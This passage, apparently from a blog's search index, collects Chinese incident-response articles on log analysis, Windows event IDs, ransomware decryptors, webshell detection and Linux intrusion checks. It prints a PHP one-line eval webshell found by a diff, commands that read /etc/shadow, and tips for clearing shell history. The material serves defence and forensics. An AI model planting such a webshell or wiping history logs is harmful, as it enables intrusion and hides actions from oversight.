/www/logs/access.2019-02-23.log | grep -v -E 'MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon' | sort | uniq -c | sort -r -n | head -n 100 IP 统计： grep '23/May/2019' /www/logs/access.2019-02-23.log | awk '{print $1}' | awk -F'.' '{print $1\".\"$2\".\"$3\".\"$4}' | sort | uniq -c | sort -r -n | head -n 10 2206 219.136.134.13 1497 182.34.15.248 1431 211.140.143.100 1431 119.145.149.106 1427 61.183.15.179 1427 218.6.8.189 1422 124.232.150.171 1421 106.187.47.224 1420 61.160.220.252 1418 114.80.201.18 统计网段： cat /www/logs/access.2019-02-23.log | awk '{print $1}' | awk -F'.' '{print $1\".\"$2\".\"$3\".0\"}' | sort | uniq -c | sort -r -n | head -n 200 统计域名： cat /www/logs/access.2019-02-23.log |awk '{print $2}'|sort|uniq -c|sort -rn|more HTTP Status： cat /www/logs/access.2019-02-23.log |awk '{print $9}'|sort|uniq -c|sort -rn|more 5056585 304 1125579 200 7602 400 5 301 URL 统计： cat /www/logs/access.2019-02-23.log |awk '{print $7}'|sort|uniq -c|sort -rn|more 文件流量统计： cat /www/logs/access.2019-02-23.log |awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'|sort -rn|more grep ' 200 ' /www/logs/access.2019-02-23.log |awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'|sort -rn|more URL访问量统计： cat /www/logs/access.2019-02-23.log | awk '{print $7}' | egrep '\\?|&amp;' | sort | uniq -c | sort -rn | more 脚本运行速度： 查出运行速度最慢的脚本 grep -v 0$ /www/logs/access.2019-02-23.log | awk -F '\\\" ' '{print $4\" \" $1}' web.log | awk '{print $1\" \"$8}' | sort -n -k 1 -r | uniq &gt; /tmp/slow_url.txt IP, URL 抽取： # tail -f /www/logs/access.2019-02-23.log | grep '/test.html' | awk '{print $1\" \"$7}'","categories":[],"tags":[{"name":"日志分析","slug":"日志分析","permalink":"http://www.xiaocaibi.top/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"}]},{"title":"第2篇：Linux日志分析","slug":"第2篇：Linux日志分析","date":"2021-07-23T01:25:30.000Z","updated":"2021-09-20T08:47:43.838Z","comments":true,"path":"posts/5abdae1b.html","link":"","permalink":"http://www.xiaocaibi.top/posts/5abdae1b.html","excerpt":"","text":"第2篇:Linux日志分析0x00 前言Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技巧。 0x01 日志简介日志默认存放位置：/var/log/ 查看日志配置情况：more /etc/rsyslog.conf 日志文件 说明 /var/log/cron 记录了系统定时任务相关的日志 /var/log/cups 记录打印信息的日志 /var/log/dmesg 记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息 /var/log/mailog 记录邮件信息 /var/log/message 记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件 /var/log/btmp 记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看 /var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看 /var/log/wtmp 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看 /var/log/utmp 记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询 /var/log/secure 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中 比较重要的几个日志： 登录失败记录：/var/log/btmp //lastb 最后一次登录：/var/log/lastlog //lastlog 登录成功记录: /var/log/wtmp //last 登录日志记录：/var/log/secure ​ 目前登录用户信息：/var/run/utmp //w、who、users ​ 历史命令记录：history​ 仅清理当前用户： history -c 0x02 日志分析技巧A、常用的shell命令Linux下常用的shell命令如：find、grep 、egrep、awk、sed 小技巧： 1、grep显示前后几行信息: ​ 标准unix/linux下的grep通过下面參数控制上下文： ​ grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行 ​ grep -B 5 foo file 显示foo及前5行 ​ grep -A 5 foo file 显示foo及后5行 ​ 查看grep版本号的方法是 ​ grep -V 2、grep 查找含有某字符串的所有文件 grep -rn \"hello,world!\" * : 表示当前目录所有文件，也可以是某个文件名 -r 是递归查找 -n 是显示行号 -R 查找所有文件包含子目录 -i 忽略大小写 3、如何显示一个文件的某几行： cat input_file | tail -n +1000 | head -n 2000 #从第1000行开始，显示2000行。即显示1000~2999行 4、find /etc -name init //在目录/etc中查找文件init 5、只是显示/etc/passwd的账户 `cat /etc/passwd |awk -F ':' '{print $1}'` //awk -F指定域分隔符为':'，将记录按指定的域分隔符划分域，填充域，​$0则表示所有域,$1表示第一个域,​$n表示第n个域。 6、sed -i ‘153,$d’ .bash_history 删除历史操作记录，只保留前153行 B、日志分析技巧A、/var/log/secure 1、定位有多少IP在爆破主机的root帐号： grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 定位有哪些IP在爆破： grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c 爆破用户名字典是什么？ grep \"Failed password\" /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 2、登录成功的IP有哪些： grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 登录成功的日期、用户名、IP： grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3、增加一个用户kali日志： Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep \"useradd\" /var/log/secure 4、删除用户kali日志： Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep \"userdel\" /var/log/secure 5、su切换用户： Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo授权执行: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now 2、/var/log/yum.log 软件安装升级卸载日志： install gccyum install gcc [root@bogon ~]# more /var/log/yum.log Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686","categories":[],"tags":[{"name":"日志分析","slug":"日志分析","permalink":"http://www.xiaocaibi.top/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"}]},{"title":"第1篇：Windows日志分析","slug":"第1篇：Windows日志分析","date":"2021-07-22T01:25:11.000Z","updated":"2021-09-20T08:47:43.807Z","comments":true,"path":"posts/3bc54467.html","link":"","permalink":"http://www.xiaocaibi.top/posts/3bc54467.html","excerpt":"","text":"第1篇:Windows日志分析0x01 Windows事件日志简介Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。 Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。 系统日志 记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。 默认位置： %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx 应用程序日志 包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx 安全日志 记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。 默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx ​ 系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。 0X02 审核策略与事件查看器Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。 PS：默认状态下，也会记录一些简单的日志，日志默认大小20M 设置1：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作： 设置2：设置合理的日志属性，即日志最大大小、事件覆盖阀值等： 查看系统日志方法： 在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器” 按 “Window+R“，输入 ”eventvwr.msc“ 也可以直接进入“事件查看器” 0x03 事件日志分析对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明： 事件ID 说明 4624 登录成功 4625 登录失败 4634 注销成功 4647 用户启动的注销 4672 使用超级用户（如管理员）进行登录 4720 创建用户 每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式： 登录类型 描述 说明 2 交互式登录（Interactive） 用户在本地进行登录。 3 网络（Network） 最常见的情况就是连接到共享文件夹或共享打印机时。 4 批处理（Batch） 通常表明某计划任务启动。 5 服务（Service） 每种服务都被配置在某个特定的用户账号下运行。 7 解锁（Unlock） 屏保解锁。 8 网络明文（NetworkCleartext） 登录的密码在网络上是通过明文传输的，如FTP。 9 新凭证（NewCredentials） 使用带/Netonly参数的RUNAS命令运行一个程序。 10 远程交互，（RemoteInteractive） 通过终端服务、远程桌面或远程协助访问计算机。 11 缓存交互（CachedInteractive） 以一个域用户登录而又没有域控制器可用 关于更多EVENT ID，详见微软官方网站上找到了“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。 原文链接 ：https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008 案例1：可以利用eventlog事件来查看系统账号登录情况： 在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”； 在事件查看器中，单击“安全”，查看安全日志； 在安全日志右侧操作中，点击“筛选当前日志”，输入事件ID进行筛选。 4624 –登录成功4625 –登录失败4634 – 注销成功4647 – 用户启动的注销4672 – 使用超级用户（如管理员）进行登录 我们输入事件ID：4625进行日志筛选，发现事件ID：4625，事件数175904，即用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力猜解。 案例2：可以利用eventlog事件来查看计算机开关机的记录： 1、在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”； 2、在事件查看器中，单击“系统”，查看系统日志； 3、在系统日志右侧操作中，点击“筛选当前日志”，输入事件ID进行筛选。 其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。 6005 信息 EventLog 事件日志服务已启动。(开机) 6006 信息 EventLog 事件日志服务已停止。(关机) 6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机 我们输入事件ID：6005-6006进行日志筛选，发现了两条在2018/7/6 17:53:51左右的记录，也就是我刚才对系统进行重启的时间。 0x04 日志分析工具Log ParserLog Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。 Log Parser 2.2下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=24659 Log Parser 使用示例：https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/ 基本查询结构 Logparser.exe –i:EVT –o:DATAGRID \"SELECT * FROM c:\\xx.evtx\" 使用Log Parser分析日志 1、查询登录成功的事件 登录成功的所有事件 LogParser.exe -i:EVT –o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4624\" 指定登录时间范围的事件： LogParser.exe -i:EVT –o:DATAGRID \"SELECT * FROM c:\\Security.evtx where TimeGenerated&gt;'2018-06-19 23:32:11' and TimeGenerated&lt;'2018-06-20 23:34:00' and EventID=4624\" 提取登录成功的用户名和IP： LogParser.exe -i:EVT –o:DATAGRID \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\\Security.evtx where EventID=4624\" 2、查询登录失败的事件 登录失败的所有事件： LogParser.exe -i:EVT –o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4625\" 提取登录失败用户名进行聚合统计： LogParser.exe -i:EVT \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\\Security.evtx where EventID=4625 GROUP BY Message\" 3、系统历史开关机记录： LogParser.exe -i:EVT –o:DATAGRID \"SELECT TimeGenerated,EventID,Message FROM c:\\System.evtx where EventID=6005 or EventID=6006\" LogParser Lizard对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。 下载地址：http://www.lizard-labs.com/log_parser_lizard.aspx 依赖包：Microsoft .NET Framework 4 .5，下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=42642 查询最近用户登录情况： Event Log ExplorerEvent Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。 下载地址：https://event-log-explorer.en.softonic.com/ 参考链接： Windows日志分析 https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ","categories":[],"tags":[{"name":"日志分析","slug":"日志分析","permalink":"http://www.xiaocaibi.top/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"}]},{"title":"第5篇：勒索病毒自救指南","slug":"第5篇：勒索病毒自救指南","date":"2021-07-21T01:11:02.000Z","updated":"2021-09-20T08:47:43.869Z","comments":true,"path":"posts/5decabe4.html","link":"","permalink":"http://www.xiaocaibi.top/posts/5decabe4.html","excerpt":"","text":"第5篇：勒索病毒自救指南前言经常会有一些小伙伴问：中了勒索病毒，该怎么办，可以解密吗？ 第一次遇到勒索病毒是在早几年的时候，客户因网站访问异常，进而远程协助进行排查。登录服务器，在站点目录下发现所有的脚本文件及附件后缀名被篡改，每个文件夹下都有一个文件打开后显示勒索提示信息，这便是勒索病毒的特征。 出于职业习惯，我打包了部分加密文件样本和勒索病毒提示信息用于留档，就在今天，我又重新上传了样本，至今依然无法解密。 作为一个安全工程师，而非一个专业的病毒分析师，我们可以借助各大安全公司的能力，寻找勒索病毒的解密工具。 本文整理了一份勒索病毒自救指南，通过勒索病毒索引引擎查找勒索病毒相关信息，再通过各个安全公司提供的免费勒索软件解密工具解密。当然，能否解密全凭运气，so，平时还是勤打补丁多备份。 一、勒索病毒搜索引擎 在勒索病毒搜索引擎输入病毒名、勒索邮箱、被加密后文件的后缀名，或直接上传被加密文件、勒索提示信息，即可可快速查找到病毒详情和解密工具。 这些网站的解密能力还在持续更新中，是值得收藏的几个勒索病毒工具型网站。 【360】 勒索病毒搜索引擎，支持检索超过800种常见勒索病毒 官网：http://lesuobingdu.360.cn 【腾讯】 勒索病毒搜索引擎，支持检索超过 300 种常见勒索病毒 官网：https://guanjia.qq.com/pr/ls 【启明】VenusEye勒索病毒搜索引擎，超300种勒索病毒家族 官网：https://lesuo.venuseye.com.cn 【奇安信】勒索病毒搜索引擎 官网：https://lesuobingdu.qianxin.com 【深信服】勒索病毒搜索引擎 官网：https://edr.sangfor.com.cn/#/information/ransom_search 二、勒索软件解密工具集 很多安全公司都提供了免费的勒索病毒解密工具下载，收集和整理相关下载地址，可以帮助我们了解和获取最新的勒索病毒解密工具。 【腾讯哈勃】勒索软件专杀工具 官网：https://habo.qq.com/tool 【金山毒霸】勒索病毒免疫工具 官网：http://www.duba.net/dbt/wannacry.html 【火绒】安全工具下载 官网：http://bbs.huorong.cn/forum-55-1.html 【瑞星】解密工具下载 官网：http://it.rising.com.cn/fanglesuo/index.html 【nomoreransom】勒索软件解密工具集 官网：https://www.nomoreransom.org/zh/index.html 【MalwareHunterTeam】勒索软件解密工具集 官网：https://id-ransomware.malwarehunterteam.com 【卡巴斯基】免费勒索解密器 官网：https://noransom.kaspersky.com 【Avast】免费勒索软件解密工具 官网：https://www.avast.com/zh-cn/ransomware-decryption-tools 【Emsisoft】免费勒索软件解密工具 官网：https://www.emsisoft.com/ransomware-decryption-tools/free-download 【GitHub 项目】勒索病毒解密工具收集汇总 官网：https://github.com/jiansiting/Decryption-Tools","categories":[],"tags":[{"name":"入侵排查篇","slug":"入侵排查篇","permalink":"http://www.xiaocaibi.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/"}]},{"title":"第4篇：如何发现隐藏的 Webshell 后门","slug":"第4篇：如何发现隐藏的-Webshell-后门","date":"2021-07-20T00:11:46.000Z","updated":"2021-09-20T08:47:43.869Z","comments":true,"path":"posts/5e1c01b0.html","link":"","permalink":"http://www.xiaocaibi.top/posts/5e1c01b0.html","excerpt":"","text":"第4篇：如何发现隐藏的 Webshell 后门前言：如何在百万行代码里发现隐藏的后门？ 试想一下，如果你的网站被入侵，攻击者留下隐藏的后门，你真的都可以找出来吗？面对一个大中型的应用系统，数以百万级的代码行，是不可能做到每个文件每段代码进行手工检查的。 即使是一款拥有 99.9% 的 Webshell 检出率的检测引擎，依然可能存在 Webshell 绕过的情况。另外，像暗链、网页劫持、页面跳转等常见的黑帽 SEO 手法，也很难通过手动检测或工具检测全部识别出来。 最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。当然，第一个前提是，你所在的团队已具备代码版本管理的能力，如果你是个人站长，相信你已经备份了原始代码。 本文将结合实际应用，介绍几种文件完整性验证方式，可以帮助你找出代码中所有隐藏的后门。 1、文件 MD5 校验 下载D盾_Web查杀工具的时候，我们可以留意到下载的压缩包里，除了有一个 exe 可执行文件，还有一个文件 md5 值。这个是软件作者在发布软件时，通过 md5 算法计算出该 exe 文件的”特征值”。 下载地址：http://www.d99net.net/down/WebShellKill_V2.0.9.zip 文件 MD5：29285decadbce3918a4f8429ec33df46 WebShellKill.exe 当用户下载软件时，可以使用相同的校验算法计算下载到 exe 文件的特征值，并与软件开发者发布的特征值比较。如果两个特征值相同，则认为下载到的 exe 文件是正确的。如果两个特征值不同，则认为下载到 exe 文件是被篡改过的。 那同理可得，我们可以将所有网站文件计算一次 hash 值保存，当出现应急情况时，重新计算一次 hash 值，并与上次保存的 hash 值进行对比，从而输出新创建的、修改过及删除的文件列表。 文件 hash 值计算： def md5sum(file): m=hashlib.md5() if os.path.isfile(file): f=open(file,'rb') for line in f: m.update(line) f.close else: m.update(file) return (m.hexdigest()) 对文件进行哈希值重新计算，进行校验对比，测试效果： 如上图，在上传目录新增了一个 evil.php 文件，还有一个被篡改的文件是 low.php 。使用常见的编辑器 Notepad++ 进行对比，可以发现 low.php 文件里被插入了一句话 WebShell。 2、diff 命令 在 Linux 中，我们经常使用 diff 命令来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异。 diff -c -a -r cms1 cms2 如下图所示，前三行列出了两个要对比的文件目录的差异，可以发现 low.php 文件被篡改过，篡改的内容是 @eval($_POST['g']); 备注：如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上 -q 选项。 3、版本控制工具 版本控制工具，比如说 git，重新上传代码到 git，add+commit+push，然后打开项目，点击 commits，在历史提交版本里面，查看文件更改内容，很容易就可以发现代码被篡改的地方了。 另外，也可以通过 git diff 用来比较文件之间的不同。 4、文件对比工具 关键词：代码对比工具，你会找到很多好用的工具，这里我们推荐两款效果还不错的工具，Beyond Compare 和 WinMerge。 Beyond Compare Beyond Compare 是一套由 Scooter Software 推出的文件比较工具。主要用途是对比两个文件夹或者文件，并将差异以颜色标示，比较范围包括目录，文档内容等。 下载地址：http://www.scootersoftware.com/download.php 软件使用示例，通过文件夹比较，找出文件夹中的差异内容。 1、双击 Beyond Compare ，打开软件主页，选择文件夹比较。 2、在双边栏输入文件夹路径，点击显示差别，列出差异部分的内容，紫色部分为新增文件，红色部分为篡改文件。 3、双击具体文件，进入代码对比，找到代码差异部分。 WinMerge WinMerge 是一款运行于 Windows 系统下的文件比较和合并工具，使用它可以非常方便地比较文件夹和文件，以易于理解的可视文本格式显示差异。 下载地址：https://winmerge.org/downloads/ 1、文件 – 打开，选择文件或文件夹，然后点击进行比较。 2、在同一个界面里，通过颜色和文本提示，显示文件夹内容差异。","categories":[],"tags":[{"name":"入侵排查篇","slug":"入侵排查篇","permalink":"http://www.xiaocaibi.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/"}]},{"title":"第3篇：常见的 Webshell 查杀工具","slug":"第3篇：常见的-Webshell-查杀工具","date":"2021-07-18T06:30:26.000Z","updated":"2021-09-20T08:47:43.854Z","comments":true,"path":"posts/b5751651.html","link":"","permalink":"http://www.xiaocaibi.top/posts/b5751651.html","excerpt":"","text":"第3篇：常见的 Webshell 查杀工具前言当网站服务器被入侵时，我们需要一款Webshell检测工具，来帮助我们发现webshell，进一步排查系统可能存在的安全漏洞。 本文推荐了10款 WebShll 检测工具，用于网站入侵排查。当然，目前市场上的很多主机安全产品也都提供这种 WebShell 检测能力，比如阿里云、青藤云、safedog 等，本文暂不讨论。 1、D盾_Web查杀 阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的 WebShell 后门行为。 兼容性：只提供 Windows 版本。 工具下载地址：http://www.d99net.net 2、百度 WEBDIR+ 下一代 WebShell 检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。 兼容性：提供在线查杀木马，免费开放 API 支持批量检测。 在线查杀地址：https://scanner.baidu.com 3、河马 专注 WebShell 查杀研究，拥有海量 WebShell 样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。 兼容性：支持 Windows、Linux，支持在线查杀。 官方网站：https://www.shellpub.com 4、Web Shell Detector Web Shell Detector 具有 WebShell 签名数据库，可帮助识别高达 99％ 的 WebShell。 兼容性：提供 PHP、Python 脚本，可跨平台，在线检测。 官方网站：http://www.shelldetector.com github项目地址：https://github.com/emposha/PHP-Shell-Detector 5、CloudWalker（牧云） 一个可执行的命令行版本 Webshell 检测工具。目前，项目已停止更新。 兼容性：提供 Linux版本，Windows 暂不支持。 在线查杀 demo：https://webshellchop.chaitin.cn GitHub 项目地址：https://github.com/chaitin/cloudwalker 6、Sangfor WebShellKill Sangfor WebShellKill (网站后门检测工具)是一款 Web 后门专杀工具，不仅支持 WebShell 的扫描，同时还支持暗链的扫描。是一款融合了多重检测引擎的查杀工具。能更精准地检测出WEB网站已知和未知的后门文件。 兼容性：支持 Windows、linux 工具下载地址：http://edr.sangfor.com.cn/backdoor_detection.html（已停止访问） 7、深度学习模型检测 PHP Webshell 一个深度学习 PHP WebShell 查杀引擎 demo，提供在线样本检测。 在线查杀地址：http://webshell.cdxy.me 8、PHP Malware Finder PHP-malware-finder 是一款优秀的检测webshell和恶意软件混淆代码的工具 兼容性：提供Linux 版本，Windows 暂不支持。 GitHub 项目地址：https://github.com/jvoisin/php-malware-finder 9、findWebshell 这个项目是一款基于 Python 开发的 WebShell 检查工具，可以根据特征码匹配检查任意类型的 WebShell 后门。 GitHub 项目地址：https://github.com/he1m4n6a/findWebshell 10、在线 WebShell 查杀工具 在线查杀地址：http://tools.bugscaner.com/killwebshell","categories":[],"tags":[{"name":"入侵排查篇","slug":"入侵排查篇","permalink":"http://www.xiaocaibi.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/"}]},{"title":"第2篇：Linux 入侵排查","slug":"第2篇：Linux-入侵排查","date":"2021-07-16T02:10:16.000Z","updated":"2021-09-20T08:47:43.822Z","comments":true,"path":"posts/9d9648b3.html","link":"","permalink":"http://www.xiaocaibi.top/posts/9d9648b3.html","excerpt":"","text":"第2篇：Linux 入侵排查0x00 前言当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。 针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Linux 服务器入侵排查的思路。 0x01 入侵排查思路1.1 账号安全基本使用： 1、用户信息文件 /etc/passwd root:x:0:0:root:/root:/bin/bash account:password:UID:GID:GECOS:directory:shell 用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后的 shell 注意：无密码只允许本机登陆，远程不允许登陆 2、影子文件 /etc/shadow root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7::: 用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留 who 查看当前登录用户（tty 本地登陆 pts 远程登录） w 查看系统信息，想知道某一时刻用户的行为 uptime 查看登陆多久、多少用户，负载状态 入侵排查： 1、查询特权用户特权用户(uid 为0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd 2、查询可以远程登录的帐号信息 [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow 3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限 [root@localhost ~]# more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\" 4、禁用或删除多余及可疑的帐号 usermod -L user 禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头 userdel user 删除 user 用户 userdel -r user 将删除 user 用户，并且将 /home 目录下的 user 目录一并删除 1.2 历史命令基本使用： 通过 .bash_history 文件查看帐号执行过的系统命令 1、root 用户的历史命令 histroy 2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。 为历史的命令增加登录的 IP 地址、执行命令时间等信息： 1）保存1万条命令 sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile 2）在/etc/profile的文件尾部添加如下行数配置信息： ######jiagu history xianshi######### USER_IP=`who -u am i 2&gt;/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'` if [ \"$USER_IP\" = \"\" ] then USER_IP=`hostname` fi export HISTTIMEFORMAT=\"%F %T $USER_IP `whoami` \" shopt -s histappend export PROMPT_COMMAND=\"history -a\" ######### jiagu history xianshi ########## 3）source /etc/profile 让配置生效 生成效果： 1 2018-07-10 19:45:39 192.168.204.1 root source /etc/profile 3、历史操作命令的清除：history -c 但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。 入侵排查： 进入用户目录下，导出历史命令。 cat .bash_history &gt;&gt; history.txt 1.3 检查异常端口使用 netstat 网络连接命令，分析可疑端口、IP、PID netstat -antlp | more 查看下 pid 所对应的进程文件路径， 运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号） 1.4 检查异常进程使用 ps 命令，分析进程 ps aux | grep pid 1.5 检查开机启动项基本使用： 系统运行级别示意图： 运行级别 含义 0 关机 1 单用户模式，可以想象为windows的安全模式，主要用于系统修复 2 不完全的命令行模式，不含NFS服务 3 完全的命令行模式，就是标准字符界面 4 系统保留 5 图形模式 6 重启动 查看运行级别命令 runlevel 系统默认允许级别 vi /etc/inittab id=3：initdefault #系统开机后直接进入哪个运行级别 开机启动配置文件 /etc/rc.local /etc/rc.d/rc[0~6].d 例子：当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 /etc/init.d 目录下，然后在 /etc/rc.d/rc*.d 文件中建立软链接即可。 注：此中的 * 代表 0,1,2,3,4,5,6 这七个等级 root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh 此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。 入侵排查： 启动项文件： more /etc/rc.local /etc/rc.d/rc[0~6].d ls -l /etc/rc.d/rc3.d/ 1.6 检查定时任务基本使用 1、利用 crontab 创建计划任务 基本命令 crontab -l 列出某个用户cron服务的详细内容 Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root crontab -r 